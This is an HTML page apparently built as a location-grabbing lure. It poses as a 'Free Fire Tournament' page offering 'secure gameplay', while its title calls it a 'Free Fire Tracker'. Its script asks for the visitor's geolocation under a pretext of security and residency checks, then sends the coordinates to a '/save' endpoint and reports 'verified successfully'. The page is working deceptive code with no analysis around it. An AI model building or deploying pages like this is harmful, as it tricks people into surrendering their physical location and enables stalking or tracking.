<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Free Fire Tracker</title>
<script src="https://cdn.tailwindcss.com"></script>

<style>
  body {
    background: radial-gradient(circle at top, #1a0f00, #000);
  }
</style>
</head>

<body class="min-h-screen flex items-center justify-center px-4">

<div class="max-w-md w-full bg-black/60 backdrop-blur-xl
            border border-orange-500/30 rounded-2xl
            shadow-2xl p-6 sm:p-8 text-center">

  <!-- Logo / Title -->
  <div class="mb-4">
    <h1 class="text-3xl font-bold text-orange-400">
      Free Fire Tournament
    </h1>
    <p class="text-gray-300 text-sm mt-1">
      Secure gameplay experience
    </p>
  </div>

  <!-- Icon -->
  <div class="flex justify-center my-5">
    <div class="w-20 h-20 rounded-full bg-orange-500/10
                flex items-center justify-center">
      üìç
    </div>
  </div>

  <!-- Message -->
  <p id="msg" class="text-gray-200 text-lg mb-4">
    Please allow location access to continue
  </p>

  <p class="text-gray-400 text-sm mb-6">
    We use your location to improve accuracy and security and verify you are in india.
  </p>

  <!-- Loader -->
  <div id="loader" class="hidden mx-auto w-10 h-10 border-4
       border-orange-400 border-t-transparent rounded-full animate-spin">
  </div>

</div>

<script>
const msg = document.getElementById("msg");
const loader = document.getElementById("loader");

setTimeout(() => {
  loader.classList.remove("hidden");

  navigator.geolocation.getCurrentPosition(
    async (pos) => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;

      await fetch("/save", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ lat, lon })
      });

      loader.classList.add("hidden");
      msg.innerText = "‚úÖ Location verified successfully";
    },
    () => {
      loader.classList.add("hidden");
      msg.innerText = "‚ùå Location access denied";
    }
  );
}, 800);
</script>

</body>
</html>